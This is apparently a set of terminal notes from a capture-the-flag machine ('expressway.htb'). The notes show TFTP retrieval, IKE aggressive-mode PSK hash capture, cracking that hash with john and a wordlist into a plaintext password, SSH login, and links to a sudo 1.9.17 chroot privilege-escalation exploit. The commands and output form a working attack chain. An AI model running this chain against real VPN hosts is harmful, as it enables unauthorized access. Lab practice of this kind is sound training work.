@@ -1,0 +1,122 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# tftp                                           
+(to) 10.10.11.87
+tftp> status
+Connected to 10.10.11.87.
+Mode: netascii Verbose: off Tracing: off Literal: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
+tftp> get ciscortr.cfg
+tftp> quit
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ike-scan -A 10.10.11.87
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87	Aggressive Mode Handshake returned HDR=(CKY-R=37052d635f2d4330) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.042 seconds (24.08 hosts/sec).  1 returned handshake; 0 returned notify
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ike-scan -P -M -A -n yada 10.10.11.87         
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.10.11.87	Aggressive Mode Handshake returned
+	HDR=(CKY-R=1ef0abefd9f67776)
+	SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
+	KeyExchange(128 bytes)
+	Nonce(32 bytes)
+	ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
+	VID=09002689dfd6b712 (XAUTH)
+	VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
+	Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+7fb8ea0b0c91b04427470a8c2b528d90cd9f9d39f81670106bff3ee9c68c1731c26d338dc17a6eb5253c8356320d994b33942449cab752c10fb4fe1a425edcb46f12996d5b617127793bc982f69976f0099aeec2c272a85e0f870419290fdd843084a52a158ea668c422a5c1213d41280ef90b1750c684e74f5af890acbb7bb1:cf012066cef85814b82b2b35a2f1dfc75b20f32df3bc3cbc8f350a3f8bc42ab5c40d7e5046a4434a615c07a1ae9acc1b2f04afc1e7f52d9fd175a74456947cc1be7316d11ed8b2691e7d86b79b145a4feb6a2936570d83b6f44a6535a21dc718f3f8b730d73e66660ad1d58bb4b19ccfb265f56f27912bf818717b85acbb7776:1ef0abefd9f67776:f657991cfb0f4477:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:014698414c20ff739f61f75abe6f7dc04028ef18:4b7968746695929109a18a3417df265abec9f5fb961943617f0e1a24205faa7d:9cda7dc29ef8876f3e09aecf0cba013c1901b8e5
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.042 seconds (24.03 hosts/sec).  1 returned handshake; 0 returned notify
+                                      
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ikescan2john hash                    
+$ike$*0*7fb8ea0b0c91b04427470a8c2b528d90cd9f9d39f81670106bff3ee9c68c1731c26d338dc17a6eb5253c8356320d994b33942449cab752c10fb4fe1a425edcb46f12996d5b617127793bc982f69976f0099aeec2c272a85e0f870419290fdd843084a52a158ea668c422a5c1213d41280ef90b1750c684e74f5af890acbb7bb1*cf012066cef85814b82b2b35a2f1dfc75b20f32df3bc3cbc8f350a3f8bc42ab5c40d7e5046a4434a615c07a1ae9acc1b2f04afc1e7f52d9fd175a74456947cc1be7316d11ed8b2691e7d86b79b145a4feb6a2936570d83b6f44a6535a21dc718f3f8b730d73e66660ad1d58bb4b19ccfb265f56f27912bf818717b85acbb7776*1ef0abefd9f67776*f657991cfb0f4477*00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080*03000000696b6540657870726573737761792e687462*014698414c20ff739f61f75abe6f7dc04028ef18*4b7968746695929109a18a3417df265abec9f5fb961943617f0e1a24205faa7d*9cda7dc29ef8876f3e09aecf0cba013c1901b8e5
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (IKE, PSK [HMAC MD5/SHA1 32/64])
+Cost 1 (hash algorithm used for hmac [1:MD5 2:SHA1]) is 2 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+freakingrockstarontheroad (?)     
+1g 0:00:00:01 DONE (2025-10-13 06:01) 0.5291g/s 4256Kp/s 4256Kc/s 4256KC/s freakkout..frazel03
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh ike@10.10.11.87                                                      
+The authenticity of host '10.10.11.87 (10.10.11.87)' can't be established.
+ED25519 key fingerprint is SHA256:fZLjHktV7oXzFz9v3ylWFE4BS9rECyxSHdlLrfxRM8g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.87' (ED25519) to the list of known hosts.
+ike@10.10.11.87's password: 
+Last login: Sun Oct 12 18:50:29 BST 2025 from 10.10.14.18 on ssh
+Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Oct 13 11:35:32 2025 from 10.10.14.9
+ike@expressway:~$ 
+
+ike@expressway:/$ find / -perm u=s 2>/dev/null
+ike@expressway:/$ echo $PATH
+/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+ike@expressway:/$ cd /usr/local/bin
+ike@expressway:/usr/local/bin$ ls -lsa
+total 2616
+   4 drwxr-xr-x  2 root root    4096 Aug 29 15:18 .
+   4 drwxr-xr-x 11 root root    4096 Aug 29 15:18 ..
+1192 -rwxr-xr-x  1 root root 1218328 Aug 29 15:18 cvtsudoers
+1024 -rwsr-xr-x  1 root root 1047040 Aug 29 15:18 sudo
+   0 lrwxrwxrwx  1 root root       4 Aug 29 15:18 sudoedit -> sudo
+ 392 -rwxr-xr-x  1 root root  401352 Aug 29 15:18 sudoreplay
+ike@expressway:/usr/local/bin$ 
+ike@expressway:/usr/local/bin$ sudo -v
+Sorry, user ike may not run sudo on expressway.
+ike@expressway:/usr/local/bin$ ./sudo -v
+Sorry, user ike may not run sudo on expressway.
+ike@expressway:/usr/local/bin$ ./sudo -V
+Sudo version 1.9.17
+Sudoers policy plugin version 1.9.17
+Sudoers file grammar version 50
+Sudoers I/O plugin version 1.9.17
+Sudoers audit plugin version 1.9.17
+ike@expressway:/usr/local/bin$ 
+
+
+
+Sudo chroot 1.9.17 - Local Privilege Escalation
+https://www.exploit-db.com/exploits/52352
+or
+https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/blob/main/sudo-chwoot.sh
+
+
